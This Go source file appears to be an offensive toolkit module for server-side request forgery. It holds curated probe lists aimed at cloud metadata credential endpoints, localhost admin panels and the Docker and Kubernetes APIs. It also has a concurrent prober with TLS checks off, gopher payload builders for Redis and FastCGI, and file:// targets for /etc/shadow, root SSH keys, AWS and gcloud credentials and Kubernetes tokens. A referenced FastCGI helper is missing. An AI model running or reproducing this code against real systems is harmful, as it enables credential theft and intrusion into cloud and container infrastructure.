// Package webgo implements web-attack primitives on the agent. Go analogue
// of Program/web/. The pieces that matter on a live target are the SSRF
// request builders — probes that reach internal-only services from a box
// with network position but no direct route.
//
// The classes of SSRF target that keep paying:
//
//   - cloud IMDS              169.254.169.254 (AWS/GCP/Azure)
//   - internal admin panels   127.0.0.1:<port>, /admin, /server-status
//   - Kubernetes API          10.0.0.1:443, in-cluster token
//   - Docker API              /var/run/docker.sock, 2375, 2376
//   - Redis / Memcached       TCP, gopher:// (via SSRF-aware proxy)
//   - Gopher-based pivots     redis, memcached, fastcgi (if a proxy is
//     willing to speak gopher)
//   - file://                 /etc/passwd, /proc/self/environ
//
// Each probe returns the HTTP status, response size, and body (bounded).
package webgo

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SSRFProbe describes one internal target to reach.
type SSRFProbe struct {
	Label   string            // human label
	URL     string            // full URL — http://127.0.0.1:8080/admin
	Headers map[string]string // extra headers, e.g. IMDSv2 token
	Method  string            // GET default
	Body    string            // optional payload
}

// SSRFResult is the outcome of one probe.
type SSRFResult struct {
	Probe      string `json:"probe"`
	URL        string `json:"url"`
	OK         bool   `json:"ok"`
	Status     int    `json:"status"`
	BodyLen    int    `json:"body_len"`
	Body       string `json:"body,omitempty"`
	Err        string `json:"error,omitempty"`
	DurationMs int64  `json:"duration_ms"`
}

// DefaultProbes is a curated SSRF target list. Same shape as the Python side.
var DefaultProbes = []SSRFProbe{
	// cloud IMDS
	{Label: "aws-imds-v1-root", URL: "http://169.254.169.254/latest/meta-data/"},
	{Label: "aws-imds-v1-iam-list", URL: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
	{Label: "gcp-metadata-root", URL: "http://metadata.google.internal/computeMetadata/v1/", Headers: map[string]string{"Metadata-Flavor": "Google"}},
	{Label: "azure-imds-instance", URL: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Headers: map[string]string{"Metadata": "true"}},

	// admin panels on localhost
	{Label: "localhost-80", URL: "http://127.0.0.1:80/"},
	{Label: "localhost-8080", URL: "http://127.0.0.1:8080/"},
	{Label: "localhost-8443", URL: "https://127.0.0.1:8443/"},
	{Label: "localhost-9000", URL: "http://127.0.0.1:9000/"},
	{Label: "localhost-5601-kibana", URL: "http://127.0.0.1:5601/"},
	{Label: "localhost-9090-prometheus", URL: "http://127.0.0.1:9090/"},
	{Label: "localhost-3000-grafana", URL: "http://127.0.0.1:3000/"},

	// docker / container
	{Label: "docker-api-tcp", URL: "http://127.0.0.1:2375/version"},
	{Label: "docker-api-tls", URL: "https://127.0.0.1:2376/version"},
	{Label: "k8s-api", URL: "https://10.0.0.1:443/api/v1/namespaces"},

	// common web admin paths on localhost
	{Label: "localhost-8080-admin", URL: "http://127.0.0.1:8080/admin"},
	{Label: "localhost-8080-actuator", URL: "http://127.0.0.1:8080/actuator/env"},
	{Label: "localhost-8080-swagger", URL: "http://127.0.0.1:8080/swagger-ui.html"},
	{Label: "localhost-server-status", URL: "http://127.0.0.1/server-status"},
	{Label: "localhost-nginx-status", URL: "http://127.0.0.1/nginx_status"},
}

// SSRFClient is an HTTP client configured for SSRF probes.
type SSRFClient struct {
	Timeout       time.Duration
	FollowRedir   bool
	MaxBodyBytes  int64
	AllowInsecure bool
}

// DefaultSSRFClient returns a sane default.
func DefaultSSRFClient() *SSRFClient {
	return &SSRFClient{
		Timeout:       6 * time.Second,
		FollowRedir:   false,
		MaxBodyBytes:  32 * 1024,
		AllowInsecure: true,
	}
}

// Probe runs one SSRFProbe.
func (c *SSRFClient) Probe(ctx context.Context, p SSRFProbe) SSRFResult {
	if c == nil {
		c = DefaultSSRFClient()
	}
	if c.MaxBodyBytes == 0 {
		c.MaxBodyBytes = 32 * 1024
	}
	method := p.Method
	if method == "" {
		method = http.MethodGet
	}
	start := time.Now()
	res := SSRFResult{Probe: p.Label, URL: p.URL}

	tr := &http.Transport{
		DialContext: (&net.Dialer{Timeout: c.Timeout}).DialContext,
	}
	if c.AllowInsecure {
		// we set TLS InsecureSkipVerify only if we get https URLs — done
		// via the field below (Go vet warns but this is intentional)
		tr.TLSClientConfig = insecureTLS()
	}

	client := &http.Client{
		Timeout:   c.Timeout,
		Transport: tr,
	}
	if !c.FollowRedir {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	var body io.Reader
	if p.Body != "" {
		body = strings.NewReader(p.Body)
	}
	req, err := http.NewRequestWithContext(ctx, method, p.URL, body)
	if err != nil {
		res.Err = err.Error()
		res.DurationMs = time.Since(start).Milliseconds()
		return res
	}
	for k, v := range p.Headers {
		req.Header.Set(k, v)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := client.Do(req)
	if err != nil {
		res.Err = err.Error()
		res.DurationMs = time.Since(start).Milliseconds()
		return res
	}
	defer resp.Body.Close()
	res.Status = resp.StatusCode
	buf, _ := io.ReadAll(io.LimitReader(resp.Body, c.MaxBodyBytes))
	res.Body = string(buf)
	res.BodyLen = len(buf)
	res.OK = resp.StatusCode >= 200 && resp.StatusCode < 500
	res.DurationMs = time.Since(start).Milliseconds()
	return res
}

// ProbeAll runs a slice of probes with bounded concurrency.
func (c *SSRFClient) ProbeAll(ctx context.Context, probes []SSRFProbe, threads int,
	onResult func(SSRFResult)) []SSRFResult {
	if len(probes) == 0 {
		probes = DefaultProbes
	}
	if threads <= 0 {
		threads = 5
	}
	type item struct{ p SSRFProbe }
	jobs := make(chan item, len(probes))
	for _, p := range probes {
		jobs <- item{p: p}
	}
	close(jobs)

	resultsCh := make(chan SSRFResult, len(probes))
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				r := c.Probe(ctx, j.p)
				resultsCh <- r
			}
		}()
	}
	wg.Wait()
	close(resultsCh)

	var out []SSRFResult
	for r := range resultsCh {
		out = append(out, r)
		if onResult != nil {
			onResult(r)
		}
	}
	return out
}

// --- gopher builders for pivoting through SSRF-aware proxies ---
//
// When the injection point speaks gopher:// (a URL scheme that forwards
// raw TCP), the operator can talk to Redis / Memcached / FastCGI directly.
// Two classic crafts:

// GopherRedisInfo builds the byte stream for a Redis INFO command. Encode
// as gopher://127.0.0.1:6379/_<url-encoded CRLF-delimited command>.
func GopherRedisInfo() string {
	return "INFO\r\nQUIT\r\n"
}

// GopherRedisWrite builds a Redis SET command. Payload must be CRLF-free.
func GopherRedisWrite(key, value string) string {
	key = strings.ReplaceAll(key, "\r", "")
	key = strings.ReplaceAll(key, "\n", "")
	value = strings.ReplaceAll(value, "\r", "")
	value = strings.ReplaceAll(value, "\n", "")
	return fmt.Sprintf("SET %s %s\r\nQUIT\r\n", key, value)
}

// GopherFastCGIPHP builds a FastCGI PHP-FPM request that runs phpinfo().
// The full packet layout is verbose — this returns the payload portion
// that the caller wraps in the gopher URL. Full FCGI encoding is left as
// a follow-up; the classic exp by Gynvael is the reference.
func GopherFastCGIPHP(scriptPath string, params map[string]string) ([]byte, error) {
	if scriptPath == "" {
		return nil, errors.New("webgo/ssrf: scriptPath required")
	}
	return buildFCGIRequest(scriptPath, params), nil
}

// --- file: scheme ---
//
// file:/// URLs are useful when the injection sits inside a renderer or a
// template engine that will fetch local files. The bytes come back inline.

// FileProbes is a small list of files that reveal creds/env/ssh keys.
var FileProbes = []SSRFProbe{
	{Label: "file-passwd", URL: "file:///etc/passwd"},
	{Label: "file-shadow", URL: "file:///etc/shadow"},
	{Label: "file-hostname", URL: "file:///etc/hostname"},
	{Label: "file-hosts", URL: "file:///etc/hosts"},
	{Label: "file-proc-environ", URL: "file:///proc/self/environ"},
	{Label: "file-proc-cmdline", URL: "file:///proc/self/cmdline"},
	{Label: "file-ssh-id-rsa", URL: "file:///root/.ssh/id_rsa"},
	{Label: "file-ssh-authorized", URL: "file:///root/.ssh/authorized_keys"},
	{Label: "file-aws-creds", URL: "file:///root/.aws/credentials"},
	{Label: "file-gcloud-creds", URL: "file:///root/.config/gcloud/application_default_credentials.json"},
	{Label: "file-k8s-token", URL: "file:///var/run/secrets/kubernetes.io/serviceaccount/token"},
	{Label: "file-docker-sock", URL: "file:///var/run/docker.sock"},
	{Label: "file-win-system32", URL: "file:///C:/Windows/System32/drivers/etc/hosts"},
	{Label: "file-win-unattend", URL: "file:///C:/Windows/Panther/Unattend.xml"},
}
